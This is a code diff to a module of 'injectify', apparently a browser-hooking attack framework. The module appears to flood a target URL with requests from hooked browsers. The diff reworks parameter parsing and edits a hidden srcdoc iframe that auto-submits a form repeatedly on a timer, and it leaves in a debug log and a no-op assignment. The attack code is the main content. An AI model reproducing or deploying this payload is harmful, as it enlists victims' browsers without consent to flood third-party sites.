@@ -5,6 +5,7 @@ let request = {
   method: 'GET',
   url: Module.params,
   body: '',
+  params: null,
   type: 'application/x-www-form-urlencoded',
   interval: 30,
   random: true
@@ -26,38 +27,40 @@ let serialize = (obj) => {
  * Parse the parameters
  */
 if (typeof Module.params == 'object') {
-  let { method, type, url, interval, random, params, body } = Module.params
+  request = {
+    ...request,
+    ...Module.params
+  }
 
-  if (typeof method !== 'undefined') request.method = method.toUpperCase()
-  if (typeof type !== 'undefined') request.type = type
-  if (typeof url !== 'undefined') request.url = url
-  if (typeof interval !== 'undefined') request.interval = interval
-  if (typeof random !== 'undefined') request.random = random
-  if (typeof params !== 'undefined' || typeof body !== 'undefined') {
-    if (!body) body = params
+  request = {
+    ...request,
+    method: request.method.toUpperCase()
+  }
+
+  if (request.body || request.params) {
+    if (!request.body) request.body = request.params
     /**
      * Convert object parameters into query string
      */
     if (request.type === 'application/x-www-form-urlencoded') {
-      if (typeof body === 'string') {
+      if (typeof request.body === 'string') {
         /**
          * Remove proceeding ?
          */
-        if (body.slice(0, 1) === '?') body = body.slice(1)
-      } else if (typeof body === 'object') {
-        body = serialize(body)
+        if (request.body.slice(0, 1) === '?') request.body = request.body.slice(1)
+      } else if (typeof request.body === 'object') {
+        request.body = serialize(request.body)
       }
     }
     /**
      * Stringify JSON
      */
     if (request.type === 'application/json') {
-      body = JSON.stringify(body)
+      request.body = JSON.stringify(request.body)
     }
-    request.body = body
+    request.body = request.body
   }
 }
-console.log(request)
 
 if (injectify.info.platform === 'browser') {
   /**
@@ -161,7 +164,7 @@ if (injectify.info.platform === 'browser') {
               'srcdoc',
               `<body onload="document.getElementsByTagName('form')[0].submit()">${
                 form.outerHTML
-              }<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${
+              }<iframe name="${frameName}" onload="console.log(1);if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${
                 request.interval
               })}"/></body>`
             )
